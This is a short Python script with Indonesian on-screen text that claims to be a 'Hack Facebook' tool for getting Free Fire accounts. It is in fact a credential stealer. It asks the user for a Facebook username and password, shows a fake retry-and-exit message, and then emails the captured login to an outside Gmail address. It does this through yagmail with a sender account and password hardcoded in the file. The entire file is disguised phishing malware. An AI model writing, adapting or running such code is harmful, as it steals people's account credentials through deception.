# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('botfacevook@gmail.com','botfacebook321')
subject='HACK FACEBOOK'
logo = """\x1b[34m

 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀  █████▒▄▄▄▄   
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██   ▒▓█████▄ 
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒████ ░▒██▒ ▄██
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▒  ░▒██░█▀  
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒█░   ░▓█  ▀█▓
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒ ░   ░▒▓███▀▒
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░     ▒░▒   ░ 
 ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  ░ ░    ░    ░ 
 ░  ░  ░      ░  ░░ ░      ░  ░           ░      
                  ░                            ░\x1b[00m"""

banner = """
\x1b[34mHack Facebook Jika Ingin Akun Dapat Free Fire
\x1b[00mLogin Dengan Akun Free Fire Anda
\x1b[00mTolong Login Terlebih Dahulu \x1b[91m!
"""
def main():
	os.system('clear')
	print(logo)
	print(banner)
	print('\x1b[00m\033[41m FACEBOOK LOGIN \033[00m')
	u=input('\x1b[00mUsername: \x1b[33m')
	p=input('\x1b[00mPassword: \x1b[33m')
	msg=('username: '+u+', password: '+p)
	body=(msg)
	print('')
	print('\x1b[00mTolong Masukkan Dgn Benar\x1b[91m !\x1b[00m')
	print('\x1b[33mTolong Ulang Lagi ...')
	os.system('sleep 3')
	print('')
	print('\x1b[00mExiting program \x1b[91m!')
	os.system('exit')
	x.send('hermansyahnoval30@gmail.com',subject,body)

main()
